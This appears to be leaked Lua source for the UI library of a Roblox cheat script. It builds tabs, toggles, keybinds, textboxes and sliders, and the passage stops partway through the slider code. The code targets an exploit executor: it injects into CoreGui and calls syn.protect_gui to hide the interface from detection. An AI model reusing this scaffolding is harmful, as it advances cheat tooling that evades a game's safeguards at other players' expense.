--Butter Dev source code

--leaked by Kissbox/Applebox


--#region UI CODE

 --#region gay
 getgenv().gay = false

 if game.Players.localPlayer:IsInGroup(7671821) then
     getgenv().gay = true
 else
     getgenv().gay = false
 end

  --[[local allowedUserIds = {
     "4175482139", -- Kissbox
     "264766302", -- Gamer
     "440361410", -- Smazt
     "424570617", -- RNG
     "303108222", -- vxlkjezlxv
     "4021049647",-- Crystalized
     "140020390", -- Tip
     "1720942089", -- Zxl
     "3000978576", -- Pluto
     "127972668", -- Wicked
     "318945749", -- Nearepick
     "1253471690", -- Nearepick alt
     "3198289631" -- Lui100
  }


  if table.find(allowedUserIds, tostring(game.Players.LocalPlayer.UserId)) then
      getgenv().gay = true
  end--]]

  --#endregion


  --#region library
  local library = {}
  local ToggleUI = false
  library.currentTab = nil
  library.flags = {}

  local services = setmetatable({}, {
    __index = function(t, k)
    return game.GetService(game, k)
  end
  })

  local mouse = services.Players.LocalPlayer:GetMouse()

  function Tween(obj, t, data)
  services.TweenService:Create(obj, TweenInfo.new(t[1], Enum.EasingStyle[t[2]], Enum.EasingDirection[t[3]]), data):Play()
  return true
  end

  local toggled = false

  -- # Switch Tabs # --
  local switchingTabs = false
  function switchTab(new)
  if switchingTabs then return end
  local old = library.currentTab
  if old == nil then
    new[2].Visible = true
    library.currentTab = new
    services.TweenService:Create(new[1], TweenInfo.new(0.1), {ImageTransparency = 0}):Play()
    services.TweenService:Create(new[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0}):Play()
    return
  end

  if old[1] == new[1] then return end
  switchingTabs = true
  library.currentTab = new

  services.TweenService:Create(old[1], TweenInfo.new(0.1), {ImageTransparency = 0.2}):Play()
  services.TweenService:Create(new[1], TweenInfo.new(0.1), {ImageTransparency = 0}):Play()
  services.TweenService:Create(old[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0.2}):Play()
  services.TweenService:Create(new[1].TabText, TweenInfo.new(0.1), {TextTransparency = 0}):Play()

  old[2].Visible = false
  new[2].Visible = true

  task.wait(0.1)

  switchingTabs = false
  end

  -- # Drag, Stolen from Kiriot or Wally # --
  function drag(frame, hold)
  if not hold then
    hold = frame
  end
  local dragging
  local dragInput
  local dragStart
  local startPos

  function Ripple(obj)
    spawn(function()
    if obj.ClipsDescendants ~= true then
      obj.ClipsDescendants = true
    end
    local Ripple = Instance.new("ImageLabel")
    Ripple.Name = "Ripple"
    Ripple.Parent = obj
    Ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Ripple.BackgroundTransparency = 1.000
    Ripple.ZIndex = 8
    Ripple.Image = "rbxassetid://2708891598"
    Ripple.ImageTransparency = 0.800
    Ripple.ScaleType = Enum.ScaleType.Fit
    Ripple.ImageColor3 = Color3.fromRGB(255, 255, 255)
    Ripple.Position = UDim2.new((mouse.X - Ripple.AbsolutePosition.X) / obj.AbsoluteSize.X, 0, (mouse.Y - Ripple.AbsolutePosition.Y) / obj.AbsoluteSize.Y, 0)
    Tween(Ripple, {.3, 'Linear', 'InOut'}, {Position = UDim2.new(-5.5, 0, -5.5, 0), Size = UDim2.new(12, 0, 12, 0)})
    wait(0.15)
    Tween(Ripple, {.3, 'Linear', 'InOut'}, {ImageTransparency = 1})
    wait(.3)
    Ripple:Destroy()
    end)
  end

  local function update(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
  end

  hold.InputBegan:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseButton1 then
    dragging = true
    dragStart = input.Position
    startPos = frame.Position

    input.Changed:Connect(function()
    if input.UserInputState == Enum.UserInputState.End then
      dragging = false
    end
    end)
  end
  end)

  frame.InputChanged:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseMovement then
    dragInput = input
  end
  end)

  services.UserInputService.InputChanged:Connect(function(input)
  if input == dragInput and dragging then
    update(input)
  end
  end)
  end

  function library.new(library, name)
  for _, v in next, services.CoreGui:GetChildren() do
    if v.Name == "frosty is cute" then
      v:Destroy()
    end
  end

  local dogent = Instance.new("ScreenGui")
  local Main = Instance.new("Frame")
  local TabMain = Instance.new("Frame")
  local MainC = Instance.new("UICorner")
  local SB = Instance.new("Frame")
  local SBC = Instance.new("UICorner")
  local Side = Instance.new("Frame")
  local SideG = Instance.new("UIGradient")
  local TabBtns = Instance.new("ScrollingFrame")
  local TabBtnsL = Instance.new("UIListLayout")
  local ScriptTitle = Instance.new("TextLabel")
  local SBG = Instance.new("UIGradient")

  if syn and syn.protect_gui then syn.protect_gui(dogent) end

  dogent.Name = "frosty is cute"
  dogent.Parent = services.CoreGui

  function UiDestroy()
    dogent:Destroy()
  end

  function ToggleUILib()
    if not ToggleUI then
      dogent.Enabled = false
      ToggleUI = true
    else
      ToggleUI = false
      dogent.Enabled = true
    end
  end

  Main.Name = "Main"
  Main.Parent = dogent
  Main.AnchorPoint = Vector2.new(0.5, 0.5)
  Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
  Main.BorderColor3 = Color3.fromRGB(25, 25, 25)
  Main.Position = UDim2.new(0.5, 0, 0.5, 0)
  Main.Size = UDim2.new(0, 572, 0, 353)

  drag(Main)

  function toggleui()
    toggled = not toggled
    spawn(function()
    if toggled then wait(0.3) end
    end)
    Tween(Main, {0.3, 'Sine', 'InOut'}, {
      Size = UDim2.new(0, 609, 0, (toggled and 505 or 0))
    })
  end

  TabMain.Name = "TabMain"
  TabMain.Parent = Main
  TabMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  TabMain.BackgroundTransparency = 1.000
  TabMain.Position = UDim2.new(0.217000037, 0, 0, 3)
  TabMain.Size = UDim2.new(0, 448, 0, 346)

  MainC.CornerRadius = UDim.new(0, 6)
  MainC.Name = "MainC"
  MainC.Parent = Main

  SB.Name = "SB"
  SB.Parent = Main
  SB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  SB.BorderColor3 = Color3.fromRGB(25, 25, 25)
  SB.Size = UDim2.new(0, 8, 0, 353)

  SBC.CornerRadius = UDim.new(0, 6)
  SBC.Name = "SBC"
  SBC.Parent = SB

  Side.Name = "Side"
  Side.Parent = SB
  Side.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  Side.BorderColor3 = Color3.fromRGB(25, 25, 25)
  Side.BorderSizePixel = 0
  Side.ClipsDescendants = true
  Side.Position = UDim2.new(1, 0, 0, 0)
  Side.Size = UDim2.new(0, 110, 0, 353)

  SideG.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(30, 30, 30))}
  SideG.Rotation = 90
  SideG.Name = "SideG"
  SideG.Parent = Side

  TabBtns.Name = "TabBtns"
  TabBtns.Parent = Side
  TabBtns.Active = true
  TabBtns.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
  TabBtns.BackgroundTransparency = 1.000
  TabBtns.BorderSizePixel = 0
  TabBtns.Position = UDim2.new(0, 0, 0.0973535776, 0)
  TabBtns.Size = UDim2.new(0, 110, 0, 318)
  TabBtns.CanvasSize = UDim2.new(0, 0, 1, 0)
  TabBtns.ScrollBarThickness = 0

  TabBtnsL.Name = "TabBtnsL"
  TabBtnsL.Parent = TabBtns
  TabBtnsL.SortOrder = Enum.SortOrder.LayoutOrder
  TabBtnsL.Padding = UDim.new(0, 12)

  pcall(function()

  function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
    local RGBcounter = 0
    if getgenv().gay == true then
      task.spawn(function()
      while wait(0.1) do
        RGBcounter = RGBcounter + 0.01
      end
      end)
    end

    ScriptTitle.Name = "ScriptTitle"
    ScriptTitle.Parent = Side
    ScriptTitle.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    ScriptTitle.BackgroundTransparency = 1.000
    ScriptTitle.Position = UDim2.new(0, 0, 0.00953488424, 0)
    ScriptTitle.Size = UDim2.new(0, 102, 0, 20)
    ScriptTitle.Font = Enum.Font.GothamSemibold
    ScriptTitle.Text = name
    if getgenv().gay == true then
      task.spawn(function()
      while wait(0.1) do
        ScriptTitle.TextColor3 = Color3.fromHSV(zigzag(RGBcounter),1,1)
      end
      end)
    else
      ScriptTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    end

  end)


    ScriptTitle.TextSize = 14.000
    ScriptTitle.TextXAlignment = Enum.TextXAlignment.Left

    SBG.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(30, 30, 30)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(30, 30, 30))}
    SBG.Rotation = 90
    SBG.Name = "SBG"
    SBG.Parent = SB

    TabBtnsL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    TabBtns.CanvasSize = UDim2.new(0, 0, 0, TabBtnsL.AbsoluteContentSize.Y + 18)
    end)

    local window = {}
    function window.Tab(window, name, icon)
      local Tab = Instance.new("ScrollingFrame")
      local TabIco = Instance.new("ImageLabel")
      local TabText = Instance.new("TextLabel")
      local TabBtn = Instance.new("TextButton")
      local TabL = Instance.new("UIListLayout")

      Tab.Name = "Tab"
      Tab.Parent = TabMain
      Tab.Active = true
      Tab.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
      Tab.BackgroundTransparency = 1.000
      Tab.Size = UDim2.new(1, 0, 1, 0)
      Tab.ScrollBarThickness = 2
      Tab.Visible = false

      TabIco.Name = "TabIco"
      TabIco.Parent = TabBtns
      TabIco.BackgroundTransparency = 1.000
      TabIco.BorderSizePixel = 0
      TabIco.Size = UDim2.new(0, 24, 0, 24)
      TabIco.Image = ("rbxassetid://%s"):format((icon or 4370341699))
      TabIco.ImageTransparency = 0.2

      TabText.Name = "TabText"
      TabText.Parent = TabIco
      TabText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      TabText.BackgroundTransparency = 1.000
      TabText.Position = UDim2.new(1.41666663, 0, 0, 0)
      TabText.Size = UDim2.new(0, 76, 0, 24)
      TabText.Font = Enum.Font.GothamSemibold
      TabText.Text = name
      TabText.TextColor3 = Color3.fromRGB(255, 255, 255)
      TabText.TextSize = 14.000
      TabText.TextXAlignment = Enum.TextXAlignment.Left
      TabText.TextTransparency = 0.2

      TabBtn.Name = "TabBtn"
      TabBtn.Parent = TabIco
      TabBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
      TabBtn.BackgroundTransparency = 1.000
      TabBtn.BorderSizePixel = 0
      TabBtn.Size = UDim2.new(0, 110, 0, 24)
      TabBtn.AutoButtonColor = false
      TabBtn.Font = Enum.Font.SourceSans
      TabBtn.Text = ""
      TabBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
      TabBtn.TextSize = 14.000

      TabL.Name = "TabL"
      TabL.Parent = Tab
      TabL.SortOrder = Enum.SortOrder.LayoutOrder
      TabL.Padding = UDim.new(0, 4)

      TabBtn.MouseButton1Click:Connect(function()
      spawn(function()
      Ripple(TabBtn)
      end)
      switchTab({TabIco, Tab})
      end)

      if library.currentTab == nil then switchTab({TabIco, Tab}) end

      TabL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
      Tab.CanvasSize = UDim2.new(0, 0, 0, TabL.AbsoluteContentSize.Y + 8)
      end)

      local tab = {}
      function tab.section(tab, name, TabVal)
        local Section = Instance.new("Frame")
        local SectionC = Instance.new("UICorner")
        local SectionText = Instance.new("TextLabel")
        local SectionOpen = Instance.new("ImageLabel")
        local SectionOpened = Instance.new("ImageLabel")
        local SectionToggle = Instance.new("ImageButton")
        local Objs = Instance.new("Frame")
        local ObjsL = Instance.new("UIListLayout")

        Section.Name = "Section"
        Section.Parent = Tab
        Section.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        Section.BackgroundTransparency = 1.000
        Section.BorderSizePixel = 0
        Section.ClipsDescendants = true
        Section.Size = UDim2.new(0.981000006, 0, 0, 36)

        SectionC.CornerRadius = UDim.new(0, 6)
        SectionC.Name = "SectionC"
        SectionC.Parent = Section

        SectionText.Name = "SectionText"
        SectionText.Parent = Section
        SectionText.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        SectionText.BackgroundTransparency = 1.000
        SectionText.Position = UDim2.new(0.0887396261, 0, 0, 0)
        SectionText.Size = UDim2.new(0, 401, 0, 36)
        SectionText.Font = Enum.Font.GothamSemibold
        SectionText.Text = name
        SectionText.TextColor3 = Color3.fromRGB(255, 255, 255)
        SectionText.TextSize = 16.000
        SectionText.TextXAlignment = Enum.TextXAlignment.Left

        SectionOpen.Name = "SectionOpen"
        SectionOpen.Parent = SectionText
        SectionOpen.BackgroundTransparency = 1
        SectionOpen.BorderSizePixel = 0
        SectionOpen.Position = UDim2.new(0, -33, 0, 5)
        SectionOpen.Size = UDim2.new(0, 26, 0, 26)
        SectionOpen.Image = "http://www.roblox.com/asset/?id=6031302934"

        SectionOpened.Name = "SectionOpened"
        SectionOpened.Parent = SectionOpen
        SectionOpened.BackgroundTransparency = 1.000
        SectionOpened.BorderSizePixel = 0
        SectionOpened.Size = UDim2.new(0, 26, 0, 26)
        SectionOpened.Image = "http://www.roblox.com/asset/?id=6031302932"
        SectionOpened.ImageTransparency = 1.000

        SectionToggle.Name = "SectionToggle"
        SectionToggle.Parent = SectionOpen
        SectionToggle.BackgroundTransparency = 1
        SectionToggle.BorderSizePixel = 0
        SectionToggle.Size = UDim2.new(0, 26, 0, 26)

        Objs.Name = "Objs"
        Objs.Parent = Section
        Objs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Objs.BackgroundTransparency = 1
        Objs.BorderSizePixel = 0
        Objs.Position = UDim2.new(0, 6, 0, 36)
        Objs.Size = UDim2.new(0.986347735, 0, 0, 0)

        ObjsL.Name = "ObjsL"
        ObjsL.Parent = Objs
        ObjsL.SortOrder = Enum.SortOrder.LayoutOrder
        ObjsL.Padding = UDim.new(0, 8)

        local open = TabVal
        if TabVal ~= false then
          Section.Size = UDim2.new(0.981000006, 0, 0, open and 36 + ObjsL.AbsoluteContentSize.Y + 8 or 36)
          SectionOpened.ImageTransparency = (open and 0 or 1)
          SectionOpen.ImageTransparency = (open and 1 or 0)
        end

        SectionToggle.MouseButton1Click:Connect(function()
        open = not open
        Section.Size = UDim2.new(0.981000006, 0, 0, open and 36 + ObjsL.AbsoluteContentSize.Y + 8 or 36)
        SectionOpened.ImageTransparency = (open and 0 or 1)
        SectionOpen.ImageTransparency = (open and 1 or 0)
        end)

        ObjsL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        if not open then return end
        Section.Size = UDim2.new(0.981000006, 0, 0, 36 + ObjsL.AbsoluteContentSize.Y + 8)
        end)

        local section = {}
        function section.Button(section, text, callback)
          local callback = callback or function() end

          local BtnModule = Instance.new("Frame")
          local Btn = Instance.new("TextButton")
          local BtnC = Instance.new("UICorner")

          BtnModule.Name = "BtnModule"
          BtnModule.Parent = Objs
          BtnModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          BtnModule.BackgroundTransparency = 1.000
          BtnModule.BorderSizePixel = 0
          BtnModule.Position = UDim2.new(0, 0, 0, 0)
          BtnModule.Size = UDim2.new(0, 428, 0, 38)

          Btn.Name = "Btn"
          Btn.Parent = BtnModule
          Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
          Btn.BorderSizePixel = 0
          Btn.Size = UDim2.new(0, 428, 0, 38)
          Btn.AutoButtonColor = false
          Btn.Font = Enum.Font.GothamSemibold
          Btn.Text = "   " .. text
          Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
          Btn.TextSize = 16.000
          Btn.TextXAlignment = Enum.TextXAlignment.Left

          BtnC.CornerRadius = UDim.new(0, 6)
          BtnC.Name = "BtnC"
          BtnC.Parent = Btn

          Btn.MouseButton1Click:Connect(function()
          spawn(function()
          Ripple(Btn)
          end)
          spawn(callback)
          end)
        end

        function section:Label(text)
          local LabelModule = Instance.new("Frame")
          local TextLabel = Instance.new("TextLabel")
          local LabelC = Instance.new("UICorner")

          LabelModule.Name = "LabelModule"
          LabelModule.Parent = Objs
          LabelModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          LabelModule.BackgroundTransparency = 1.000
          LabelModule.BorderSizePixel = 0
          LabelModule.Position = UDim2.new(0, 0, NAN, 0)
          LabelModule.Size = UDim2.new(0, 428, 0, 19)

          TextLabel.Parent = LabelModule
          TextLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
          TextLabel.Size = UDim2.new(0, 428, 0, 22)
          TextLabel.Font = Enum.Font.GothamSemibold
          TextLabel.Text = text
          TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
          TextLabel.TextSize = 14.000

          LabelC.CornerRadius = UDim.new(0, 6)
          LabelC.Name = "LabelC"
          LabelC.Parent = TextLabel
          return TextLabel
        end

        function section.Toggle(section, text, flag, enabled, callback)
          local callback = callback or function() end
          local enabled = enabled or false
          assert(text, "No text provided")
          assert(flag, "No flag provided")

          library.flags[flag] = enabled

          local ToggleModule = Instance.new("Frame")
          local ToggleBtn = Instance.new("TextButton")
          local ToggleBtnC = Instance.new("UICorner")
          local ToggleDisable = Instance.new("Frame")
          local ToggleSwitch = Instance.new("Frame")
          local ToggleSwitchC = Instance.new("UICorner")
          local ToggleDisableC = Instance.new("UICorner")

          ToggleModule.Name = "ToggleModule"
          ToggleModule.Parent = Objs
          ToggleModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          ToggleModule.BackgroundTransparency = 1.000
          ToggleModule.BorderSizePixel = 0
          ToggleModule.Position = UDim2.new(0, 0, 0, 0)
          ToggleModule.Size = UDim2.new(0, 428, 0, 38)

          ToggleBtn.Name = "ToggleBtn"
          ToggleBtn.Parent = ToggleModule
          ToggleBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
          ToggleBtn.BorderSizePixel = 0
          ToggleBtn.Size = UDim2.new(0, 428, 0, 38)
          ToggleBtn.AutoButtonColor = false
          ToggleBtn.Font = Enum.Font.GothamSemibold
          ToggleBtn.Text = "   " .. text
          ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
          ToggleBtn.TextSize = 16.000
          ToggleBtn.TextXAlignment = Enum.TextXAlignment.Left

          ToggleBtnC.CornerRadius = UDim.new(0, 6)
          ToggleBtnC.Name = "ToggleBtnC"
          ToggleBtnC.Parent = ToggleBtn

          ToggleDisable.Name = "ToggleDisable"
          ToggleDisable.Parent = ToggleBtn
          ToggleDisable.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
          ToggleDisable.BorderSizePixel = 0
          ToggleDisable.Position = UDim2.new(0.901869178, 0, 0.208881587, 0)
          ToggleDisable.Size = UDim2.new(0, 36, 0, 22)

          ToggleSwitch.Name = "ToggleSwitch"
          ToggleSwitch.Parent = ToggleDisable
          ToggleSwitch.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
          ToggleSwitch.Size = UDim2.new(0, 24, 0, 22)

          ToggleSwitchC.CornerRadius = UDim.new(0, 6)
          ToggleSwitchC.Name = "ToggleSwitchC"
          ToggleSwitchC.Parent = ToggleSwitch

          ToggleDisableC.CornerRadius = UDim.new(0, 6)
          ToggleDisableC.Name = "ToggleDisableC"
          ToggleDisableC.Parent = ToggleDisable

          local funcs = {
            SetState = function(self, state)
            if state == nil then state = not library.flags[flag] end
            if library.flags[flag] == state then return end
            services.TweenService:Create(ToggleSwitch, TweenInfo.new(0.2), {Position = UDim2.new(0, (state and ToggleSwitch.Size.X.Offset / 2 or 0), 0, 0), BackgroundColor3 = (state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(25, 25, 25))}):Play()
            library.flags[flag] = state
            callback(state)
            end,
            Module = ToggleModule
          }

          if enabled ~= false then
            funcs:SetState(flag,true)
          end

          ToggleBtn.MouseButton1Click:Connect(function()
          funcs:SetState()
          end)
          return funcs
        end

        function section.Keybind(section, text, default, callback)
          local callback = callback or function() end
          assert(text, "No text provided")
          assert(default, "No default key provided")

          local default = (typeof(default) == "string" and Enum.KeyCode[default] or default)
          local banned = {
            Return = true;
            Space = true;
            Tab = true;
            Backquote = true;
            CapsLock = true;
            Escape = true;
            Unknown = true;
          }
          local shortNames = {
            RightControl = 'Right Ctrl',
            LeftControl = 'Left Ctrl',
            LeftShift = 'Left Shift',
            RightShift = 'Right Shift',
            Semicolon = ";",
            Quote = '"',
            LeftBracket = '[',
            RightBracket = ']',
            Equals = '=',
            Minus = '-',
            RightAlt = 'Right Alt',
            LeftAlt = 'Left Alt'
          }

          local bindKey = default
          local keyTxt = (default and (shortNames[default.Name] or default.Name) or "None")

          local KeybindModule = Instance.new("Frame")
          local KeybindBtn = Instance.new("TextButton")
          local KeybindBtnC = Instance.new("UICorner")
          local KeybindValue = Instance.new("TextButton")
          local KeybindValueC = Instance.new("UICorner")
          local KeybindL = Instance.new("UIListLayout")
          local UIPadding = Instance.new("UIPadding")

          KeybindModule.Name = "KeybindModule"
          KeybindModule.Parent = Objs
          KeybindModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          KeybindModule.BackgroundTransparency = 1.000
          KeybindModule.BorderSizePixel = 0
          KeybindModule.Position = UDim2.new(0, 0, 0, 0)
          KeybindModule.Size = UDim2.new(0, 428, 0, 38)

          KeybindBtn.Name = "KeybindBtn"
          KeybindBtn.Parent = KeybindModule
          KeybindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
          KeybindBtn.BorderSizePixel = 0
          KeybindBtn.Size = UDim2.new(0, 428, 0, 38)
          KeybindBtn.AutoButtonColor = false
          KeybindBtn.Font = Enum.Font.GothamSemibold
          KeybindBtn.Text = "   " .. text
          KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
          KeybindBtn.TextSize = 16.000
          KeybindBtn.TextXAlignment = Enum.TextXAlignment.Left

          KeybindBtnC.CornerRadius = UDim.new(0, 6)
          KeybindBtnC.Name = "KeybindBtnC"
          KeybindBtnC.Parent = KeybindBtn

          KeybindValue.Name = "KeybindValue"
          KeybindValue.Parent = KeybindBtn
          KeybindValue.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
          KeybindValue.BorderSizePixel = 0
          KeybindValue.Position = UDim2.new(0.763033211, 0, 0.289473683, 0)
          KeybindValue.Size = UDim2.new(0, 100, 0, 28)
          KeybindValue.AutoButtonColor = false
          KeybindValue.Font = Enum.Font.Gotham
          KeybindValue.Text = keyTxt
          KeybindValue.TextColor3 = Color3.fromRGB(255, 255, 255)
          KeybindValue.TextSize = 14.000

          KeybindValueC.CornerRadius = UDim.new(0, 6)
          KeybindValueC.Name = "KeybindValueC"
          KeybindValueC.Parent = KeybindValue

          KeybindL.Name = "KeybindL"
          KeybindL.Parent = KeybindBtn
          KeybindL.HorizontalAlignment = Enum.HorizontalAlignment.Right
          KeybindL.SortOrder = Enum.SortOrder.LayoutOrder
          KeybindL.VerticalAlignment = Enum.VerticalAlignment.Center

          UIPadding.Parent = KeybindBtn
          UIPadding.PaddingRight = UDim.new(0, 6)

          services.UserInputService.InputBegan:Connect(function(inp, gpe)
          if gpe then return end
          if inp.UserInputType ~= Enum.UserInputType.Keyboard then return end
          if inp.KeyCode ~= bindKey then return end
          callback(bindKey.Name)
          end)

          KeybindValue.MouseButton1Click:Connect(function()
          KeybindValue.Text = "..."
          wait()
          local key, uwu = services.UserInputService.InputEnded:Wait()
          local keyName = tostring(key.KeyCode.Name)
          if key.UserInputType ~= Enum.UserInputType.Keyboard then
            KeybindValue.Text = keyTxt
            return
          end
          if banned[keyName] then
            KeybindValue.Text = keyTxt
            return
          end
          wait()
          bindKey = Enum.KeyCode[keyName]
          KeybindValue.Text = shortNames[keyName] or keyName
          end)

          KeybindValue:GetPropertyChangedSignal("TextBounds"):Connect(function()
          KeybindValue.Size = UDim2.new(0, KeybindValue.TextBounds.X + 30, 0, 28)
          end)
          KeybindValue.Size = UDim2.new(0, KeybindValue.TextBounds.X + 30, 0, 28)
        end

        function section.Textbox(section, text, flag, default, callback)
          local callback = callback or function() end
          assert(text, "No text provided")
          assert(flag, "No flag provided")
          assert(default, "No default text provided")

          library.flags[flag] = default

          local TextboxModule = Instance.new("Frame")
          local TextboxBack = Instance.new("TextButton")
          local TextboxBackC = Instance.new("UICorner")
          local BoxBG = Instance.new("TextButton")
          local BoxBGC = Instance.new("UICorner")
          local TextBox = Instance.new("TextBox")
          local TextboxBackL = Instance.new("UIListLayout")
          local TextboxBackP = Instance.new("UIPadding")

          TextboxModule.Name = "TextboxModule"
          TextboxModule.Parent = Objs
          TextboxModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          TextboxModule.BackgroundTransparency = 1.000
          TextboxModule.BorderSizePixel = 0
          TextboxModule.Position = UDim2.new(0, 0, 0, 0)
          TextboxModule.Size = UDim2.new(0, 428, 0, 38)

          TextboxBack.Name = "TextboxBack"
          TextboxBack.Parent = TextboxModule
          TextboxBack.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
          TextboxBack.BorderSizePixel = 0
          TextboxBack.Size = UDim2.new(0, 428, 0, 38)
          TextboxBack.AutoButtonColor = false
          TextboxBack.Font = Enum.Font.GothamSemibold
          TextboxBack.Text = "   " .. text
          TextboxBack.TextColor3 = Color3.fromRGB(255, 255, 255)
          TextboxBack.TextSize = 16.000
          TextboxBack.TextXAlignment = Enum.TextXAlignment.Left

          TextboxBackC.CornerRadius = UDim.new(0, 6)
          TextboxBackC.Name = "TextboxBackC"
          TextboxBackC.Parent = TextboxBack

          BoxBG.Name = "BoxBG"
          BoxBG.Parent = TextboxBack
          BoxBG.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
          BoxBG.BorderSizePixel = 0
          BoxBG.Position = UDim2.new(0.763033211, 0, 0.289473683, 0)
          BoxBG.Size = UDim2.new(0, 100, 0, 28)
          BoxBG.AutoButtonColor = false
          BoxBG.Font = Enum.Font.Gotham
          BoxBG.Text = ""
          BoxBG.TextColor3 = Color3.fromRGB(255, 255, 255)
          BoxBG.TextSize = 14.000

          BoxBGC.CornerRadius = UDim.new(0, 6)
          BoxBGC.Name = "BoxBGC"
          BoxBGC.Parent = BoxBG

          TextBox.Parent = BoxBG
          TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          TextBox.BackgroundTransparency = 1.000
          TextBox.BorderSizePixel = 0
          TextBox.Size = UDim2.new(1, 0, 1, 0)
          TextBox.Font = Enum.Font.Gotham
          TextBox.Text = default
          TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
          TextBox.TextSize = 14.000

          TextboxBackL.Name = "TextboxBackL"
          TextboxBackL.Parent = TextboxBack
          TextboxBackL.HorizontalAlignment = Enum.HorizontalAlignment.Right
          TextboxBackL.SortOrder = Enum.SortOrder.LayoutOrder
          TextboxBackL.VerticalAlignment = Enum.VerticalAlignment.Center

          TextboxBackP.Name = "TextboxBackP"
          TextboxBackP.Parent = TextboxBack
          TextboxBackP.PaddingRight = UDim.new(0, 6)

          TextBox.FocusLost:Connect(function()
          if TextBox.Text == "" then
            TextBox.Text = default
          end
          library.flags[flag] = TextBox.Text
          callback(TextBox.Text)
          end)

          TextBox:GetPropertyChangedSignal("TextBounds"):Connect(function()
          BoxBG.Size = UDim2.new(0, TextBox.TextBounds.X + 30, 0, 28)
          end)
          BoxBG.Size = UDim2.new(0, TextBox.TextBounds.X + 30, 0, 28)
        end

        function section.Slider(section, text, flag, default, min, max, precise, callback)
          local callback = callback or function() end
          local min = min or 1
          local max = max or 10
          local default = default or min
          local precise = precise or false

          library.flags[flag] = default

          assert(text, "No text provided")
          assert(flag, "No flag provided")
          assert(default, "No default value provided")

          local SliderModule = Instance.new("Frame")
          local SliderBack = Instance.new("TextButton")
          local SliderBackC = Instance.new("UICorner")
          local SliderBar = Instance.new("Frame")
          local SliderBarC = Instance.new("UICorner")
          local SliderPart = Instance.new("Frame")
          local SliderPartC = Instance.new("UICorner")
          local SliderValBG = Instance.new("TextButton")
          local SliderValBGC = Instance.new("UICorner")
          local SliderValue = Instance.new("TextBox")
          local MinSlider = Instance.new("TextButton")
          local AddSlider = Instance.new("TextButton")

          SliderModule.Name = "SliderModule"
          SliderModule.Parent = Objs
          SliderModule.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          SliderModule.BackgroundTransparency = 1.000
          SliderModule.BorderSizePixel = 0
          SliderModule.Position = UDim2.new(0, 0, 0, 0)
          SliderModule.Size = UDim2.new(0, 428, 0, 38)

          SliderBack.Name = "SliderBack"
          SliderBack.Parent = SliderModule
          SliderBack.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
          SliderBack.BorderSizePixel = 0
          SliderBack.Size = UDim2.new(0, 428, 0, 38)
          SliderBack.AutoButtonColor = false
          SliderBack.Font = Enum.Font.GothamSemibold
          SliderBack.Text = "   " .. text
          SliderBack.TextColor3 = Color3.fromRGB(255, 255, 255)
          SliderBack.TextSize = 16.000
          SliderBack.TextXAlignment = Enum.TextXAlignment.Left

          SliderBackC.CornerRadius = UDim.new(0, 6)
          SliderBackC.Name = "SliderBackC"
          SliderBackC.Parent = SliderBack

          SliderBar.Name = "SliderBar"
          SliderBar.Parent = SliderBack
          SliderBar.AnchorPoint = Vector2.new(0, 0.5)
          SliderBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
          SliderBar.BorderSizePixel = 0
          SliderBar.Position = UDim2.new(0.369000018, 40, 0.5, 0)
          SliderBar.Size = UDim2.new(0, 140, 0, 12)

          SliderBarC.CornerRadius = UDim.new(0, 4)
          SliderBarC.Name = "SliderBarC"
          SliderBarC.Parent = SliderBar

          SliderPart.Name = "SliderPart"
          SliderPart.Parent = SliderBar
          SliderPart.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
          SliderPart.BorderSizePixel = 0
